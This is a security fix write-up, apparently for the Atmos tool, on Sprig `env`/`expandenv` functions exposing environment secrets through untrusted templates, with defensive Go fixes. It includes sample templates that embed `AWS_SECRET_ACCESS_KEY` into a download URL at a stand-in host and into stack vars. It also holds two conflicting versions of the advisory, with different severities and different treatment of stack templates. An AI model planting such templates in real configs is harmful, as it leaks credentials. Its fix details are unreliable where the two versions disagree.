# Sprig `env`/`expandenv` Exfiltration via Untrusted Templates

**Date:** 2026-04-01
**Severity:** Medium — CWE-526 (Cleartext Storage of Sensitive Information in Environment Variables)
**Scope:** Asset URL templates (Aqua registry, installer) — NOT stack templates (intentional feature)

**Files fixed:**
- `pkg/toolchain/installer/asset.go` (asset URL template rendering — was `TxtFuncMap` with no env cleanup)
- `pkg/toolchain/registry/aqua/aqua.go` (Aqua registry asset templates — was `TxtFuncMap` + manual `delete()`)

**Files updated (security improvement, backward-compatible):**
- `internal/exec/template_utils.go` — Sprig base switched to `HermeticTxtFuncMap`; `env`/`expandenv` re-added explicitly
- `pkg/locals/resolver.go` — Sprig base switched to `HermeticTxtFuncMap`; `env`/`expandenv` re-added explicitly

---

## Symptom

An Aqua registry YAML file or asset URL template containing:

```yaml
source: 'https://example.com/download?token={{ env "AWS_SECRET_ACCESS_KEY" }}'
```

would have been rendered successfully, allowing a remote/community registry template to read
arbitrary process environment variables (credentials, tokens) at install time.

---

## Root Cause

Multiple template rendering paths used `sprig.TxtFuncMap()` (or `sprig.FuncMap()`), which
includes `env`, `expandenv`, and `getHostByName`.

Sprig ships a hermetic variant specifically for untrusted-template contexts:

| Function | Exposes `env`/`expandenv` |
|----------|--------------------------|
| `sprig.FuncMap()` | **Yes** |
| `sprig.TxtFuncMap()` | **Yes** |
| `sprig.HermeticTxtFuncMap()` | **No** — intentionally omitted |

### Aqua registry templates (untrusted — now fixed)

`pkg/toolchain/installer/asset.go` and `pkg/toolchain/registry/aqua/aqua.go` render asset
URL templates from remote Aqua registries. These templates are partially untrusted and should
not be able to read arbitrary env vars. The `aqua.go` code attempted to mitigate this via
manual `delete(funcs, "env")` but this pattern is fragile. Both files now use
`sprig.HermeticTxtFuncMap()` directly.

### Stack templates (trusted — env is an intentional feature)

`internal/exec/template_utils.go` and `pkg/locals/resolver.go` render Atmos stack manifests.
`{{ env "KEY" }}` is a **documented, intentional feature** of Atmos stack templates, used e.g.
to inject git tokens in `vendor.yaml` source URLs or to embed the current user in stack vars.

The Sprig base is now `HermeticTxtFuncMap()` (removing other OS/network side-effects like
`getHostByName`) but `env` and `expandenv` are **explicitly re-added** as a deliberate design
decision, not inherited from the full Sprig map.

---

## Fix

### Aqua registry / installer templates (untrusted — full env removal)

```go
// pkg/toolchain/installer/asset.go — after
funcs := sprig.HermeticTxtFuncMap()  // env/expandenv omitted

// pkg/toolchain/registry/aqua/aqua.go — after (manual deletes replaced)
funcs := sprig.HermeticTxtFuncMap()  // env/expandenv/getHostByName omitted
```

### Stack templates (trusted — explicit re-provision)

```go
// internal/exec/template_utils.go — getSprigFuncMap uses HermeticTxtFuncMap
// getEnvFuncMap explicitly provides env/expandenv for stack templates
func getEnvFuncMap() template.FuncMap {
    return template.FuncMap{
        "env":       os.Getenv,
        "expandenv": os.ExpandEnv,
    }
}
// Assembled: gomplate + hermetic sprig + explicit env + atmos funcmap
funcs := lo.Assign(gomplate.CreateFuncs(ctx, &d), getSprigFuncMap(), getEnvFuncMap(), FuncMap(...))
```

---

## Related

- Sprig docs: <https://masterminds.github.io/sprig/> — "Hermetic" section
- CWE-526: <https://cwe.mitre.org/data/definitions/526.html>


**Date:** 2026-04-01
**Severity:** High — CWE-526 (Cleartext Storage of Sensitive Information in Environment Variables)
**Files fixed:**
- `internal/exec/template_utils.go` (cached sprig funcmap, `getSprigFuncMap`)
- `pkg/locals/resolver.go` (locals template rendering, line ~456)
- `pkg/toolchain/installer/asset.go` (asset URL template rendering)
- `pkg/toolchain/registry/aqua/aqua.go` (Aqua registry asset templates — previously used manual deletes, now hermetic)

---

## Symptom

A vendored or community-provided component stack template containing:

```yaml
vars:
  secret: '{{ env "AWS_SECRET_ACCESS_KEY" }}'
```

renders successfully with no error or warning. The value of `AWS_SECRET_ACCESS_KEY` (or any
other process environment variable) is injected into the stack configuration at plan/apply time.
If this value reaches a Terraform output, a log line, or a CI artifact, the secret is exfiltrated
with no explicit developer action required.

---

## Root Cause

Both template rendering paths used `sprig.FuncMap()`, which includes `env` and `expandenv`:

### Path 1 — `internal/exec/template_utils.go` (`getSprigFuncMap`)

```go
// Before
sprigFuncMapCacheOnce.Do(func() {
    sprigFuncMapCache = sprig.FuncMap()   // exposes env/expandenv
})
```

This cached funcmap is merged into every `ProcessTmpl` call and therefore into all stack
template rendering (vars, settings, outputs, etc.).

### Path 2 — `pkg/locals/resolver.go` (locals block resolution)

```go
// Before
tmpl, err := template.New(localName).Funcs(sprig.FuncMap()).Parse(strVal)
```

The `locals` block in stack files is rendered with its own template pass that also used the
full (non-hermetic) sprig funcmap.

Sprig ships two variants of its funcmap:

| Function | Exposes `env`/`expandenv` |
|----------|--------------------------|
| `sprig.FuncMap()` | **Yes** |
| `sprig.TxtFuncMap()` | **Yes** |
| `sprig.HermeticTxtFuncMap()` | **No** — intentionally omitted |

The hermetic variant is documented by Sprig specifically for use in contexts where the template
author is not fully trusted, because `env`/`expandenv` allow reading arbitrary process state.

---

## Impact

Any atmos user who vendors a component containing a malicious or accidentally-leaking stack
template can have secrets from their shell environment (AWS credentials, tokens, API keys) read
and embedded in rendered stack configuration. No approval or configuration change is required
from the developer running atmos.

---

## Fix

Replace `sprig.FuncMap()` / `sprig.TxtFuncMap()` with `sprig.HermeticTxtFuncMap()` in all
three template rendering paths:

```go
// internal/exec/template_utils.go — after
sprigFuncMapCacheOnce.Do(func() {
    sprigFuncMapCache = sprig.HermeticTxtFuncMap()
})

// pkg/locals/resolver.go — after
tmpl, err := template.New(localName).Funcs(sprig.HermeticTxtFuncMap()).Parse(strVal)

// pkg/toolchain/installer/asset.go — after (previously used TxtFuncMap with no manual cleanup)
funcs := sprig.HermeticTxtFuncMap()

// pkg/toolchain/registry/aqua/aqua.go — after (previously used TxtFuncMap + manual deletes)
funcs := sprig.HermeticTxtFuncMap()
// No need to delete env/expandenv/getHostByName — HermeticTxtFuncMap omits them already
```

`HermeticTxtFuncMap` excludes `env`, `expandenv`, and `getHostByName` (and any other
functions with external side-effects), while keeping all pure string, math, date, list,
dict, and encoding functions that templates legitimately need.

---

## Affected Functionality

Templates that relied on `env` or `expandenv` to inject environment variables into stack
configs will stop working. The recommended replacement is the `!env` YAML function (when
reading env vars at config-load time is appropriate) or passing values explicitly through
component variables.

---

## Related

- `internal/exec/template_utils.go`: `getSprigFuncMap` (caches the sprig funcmap)
- `pkg/locals/resolver.go`: `renderTemplate` (locals block template pass)
- Sprig docs: <https://masterminds.github.io/sprig/> — "Hermetic" section
- CWE-526: <https://cwe.mitre.org/data/definitions/526.html>
